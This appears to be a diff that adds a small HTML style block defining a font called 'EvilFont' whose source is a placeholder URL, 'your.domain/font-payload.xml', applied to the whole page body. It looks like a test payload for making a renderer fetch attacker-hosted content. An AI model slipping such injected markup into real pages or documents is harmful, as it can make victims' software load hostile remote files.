@@ -1,0 +1,7 @@
+<style>
+@font-face {
+  font-family: EvilFont;
+  src: url("https://your.domain/font-payload.xml");
+}
+body { font-family: EvilFont; }
+</style>
